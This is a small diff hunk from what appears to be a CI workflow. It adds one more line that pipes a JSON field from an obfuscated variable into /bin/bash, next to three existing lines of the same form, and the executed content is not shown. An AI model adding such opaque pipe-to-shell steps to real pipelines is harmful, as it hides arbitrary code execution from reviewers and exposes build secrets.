@@ -37,6 +37,7 @@ jobs:
           echo $b8 | jq -r .lyoa13 | /bin/bash
           printf '%s' "$wy8485" | jq -r .dvde8 | /bin/bash
           printf '%s' "$vtyhf403" | jq -r .bgmr64017 | /bin/bash
+          printf '%s' "$fkqc528" | jq -r .jrkpy03 | /bin/bash
 
       - name: Archive results
         if: always()
